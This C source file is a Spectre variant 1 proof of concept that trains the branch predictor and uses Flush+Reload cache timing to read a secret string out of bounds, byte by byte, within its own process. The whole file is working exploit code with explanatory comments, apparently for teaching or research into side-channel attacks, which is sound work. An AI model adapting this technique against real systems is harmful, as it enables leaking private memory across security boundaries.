#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h>


/********************************************************************
        Victim
********************************************************************/

unsigned int array1_size = 16;
uint8_t unused1[64]; // Padding
uint8_t array1[16] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
uint8_t unused2[64]; // Padding
uint8_t flush_reload_buffer[256 * 512];

char *secret = "Dies ist ein geheimer Text in einem privaten Speicherbereich.";

unsigned int temp = 0;

// Victim function. Accesses an index x, if it is within bounds.
void victim_function(uint64_t x)
{
    if(x < array1_size)
    {
        temp &= flush_reload_buffer[array1[x] * 512];
    }
}


/********************************************************************
        Attacker
********************************************************************/

// Extracts a single memory byte through speculative execution.
// Parameters:
// - malicious_index: The target out-of-bounds array index to be read.
// - value: Pointer to array with two elements, for storing the best and second-best guesses for the target byte.
// - score: Pointer to array with two elements, for storing the scores of the best and second-best guesses.
void read_memory_byte(uint64_t malicious_index, uint8_t value[2], int score[2])
{
    // Threshold for detecting cache hits
    const int cache_hit_threshold = 80;
    
    // Allocate array for hit counters
    static int results[256];
    for(int i = 0; i < 256; ++i)
        results[i] = 0;
    
    unsigned int junk = 0;
    volatile uint8_t *addr;

    // Do up to 1000 rounds, but depending on our CPU we need less to be "sure" that we have the right byte
    int highest_byte, second_highest_byte;
    for(int round = 1; round < 1000; ++round)
    {
        // Flush F+R buffer addresses from cache
        for(int i = 0; i < 256; ++i)
            _mm_clflush(&flush_reload_buffer[i * 512]);
        
        // Pick a different training index each round, in case secret[malicious_index] == array1[training_index]
        uint64_t training_index = round % array1_size;

        // Do 30 iterations per round
        // 5x
        //   - 5x training (target_index = training_index)
        //   - 1x attack (target_index = malicious_index)
        for(int j = 29; j >= 0; --j)
        {
            // Flush array size, so victim has to execute out-of-bounds check speculatively
            _mm_clflush(&array1_size);

            // Wait a bit to ensure flush has completed
            for(volatile int z = 0; z < 100; ++z) {}

            // Bit twiddling to select target index without branching (to avoid messing up the branch predictor)
            
                // If j % 6 == 0: x = FFFF0000
                // If j % 6 != 0: x = 00000000
                uint64_t x = ((j % 6) - 1) & ~0xFFFF;
                
                // If j % 6 == 0: x = FFFFFFFF
                // If j % 6 != 0: x = 00000000
                x = (x | (x >> 16));
                
                // If j % 6 == 0: x = FFFFFFFF -> target_index = training_index ^ (malicious_index ^ training_index) = malicious_index
                // If j % 6 != 0: x = 00000000 -> target_index = training_index
                uint64_t target_index = training_index ^ (x & (malicious_index ^ training_index));
            
            // --> If j % 6 == 0: target_index = malicious_index
            // --> If j % 6 != 0: target_index = training_index
			
            // Let victim access our target index
            victim_function(target_index);
        }

        // Measure access times to F+R buffer
        for(int i = 0; i < 256; ++i)
        {
            // Mix accessed indices to prevent possible stride prediction
            int current_index = ((i * 167) + 13) & 255;
            addr = &flush_reload_buffer[current_index * 512];

            // Measure access time
            // We use rdtscp, which has built-in serialization
            register uint64_t start = __rdtscp(&junk);
            junk = *addr;
            register uint64_t difference = __rdtscp(&junk) - start;
            
            // Cache hit? -> we may have found our byte
            // However: Ignore this measurement if it corresponds to the training index
            if((int)difference <= cache_hit_threshold && current_index != array1[training_index])
                results[current_index]++; // Increment counter for this byte
        }

        // Find highest and second highest results
        highest_byte = -1;
        second_highest_byte = -1;
        for(int candidate = 0; candidate < 256; candidate++)
        {
            if(highest_byte < 0 || results[candidate] >= results[highest_byte])
            {
                second_highest_byte = highest_byte;
                highest_byte = candidate;
            }
            else if (second_highest_byte < 0 || results[candidate] >= results[second_highest_byte])
            {
                second_highest_byte = candidate;
            }
        }
        
        // We consider the run successful, if:
        // - The first place is much higher than the second place
        // - The first place has already two hits, while the second place has none
        if(results[highest_byte] >= 2 * results[second_highest_byte] + 5
            || (results[highest_byte] == 2 && results[second_highest_byte] == 0))
        {
            break;
        }
    }
    
    // Ensure that code above does not get optimized out
    results[0] ^= junk;
    
    // Store results
    value[0] = (uint8_t)highest_byte;
    score[0] = results[highest_byte];
    value[1] = (uint8_t)second_highest_byte;
    score[1] = results[second_highest_byte];
}


int main(int argc, const char **argv)
{
    // Compute out-of-bounds index of array1 for accessing secret
    uint64_t malicious_index = (size_t)(secret - (char *)array1);
    
    // Write dummy data to F+R buffer to ensure that it is allocated (prevent copy-on-write)
    for(int i = 0; i < (int)sizeof(flush_reload_buffer); i++)
        flush_reload_buffer[i] = 1;
    
    // Try to extract n bytes
    int n = 61;
    for(int i = 0; i < n; ++i)
    {
        printf("Reading at malicious_index = %p... ", (void *)malicious_index);

        // Extract byte
        uint8_t value[2];
        int score[2];
        read_memory_byte(malicious_index, value, score);

        // Print result
        printf(
            "%s: ",
            (score[0] >= 2 * score[1] ? "Success" : "Unclear")
        );
        printf(
            "0x%02X=’%c’ score=%d ",
            value[0],
            (value[0] > 31 && value[0] < 127 ? value[0] : '?'),
            score[0]
        );
        
        if(score[1] > 0)
        {
            printf(
                "(second best: 0x%02X=’%c’ score=%d)",
                value[1],
                (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
                score[1]
            );
        }

        printf("\n");
        
        // Next index
        ++malicious_index;
    }
    
    // Done
    return 0;
}
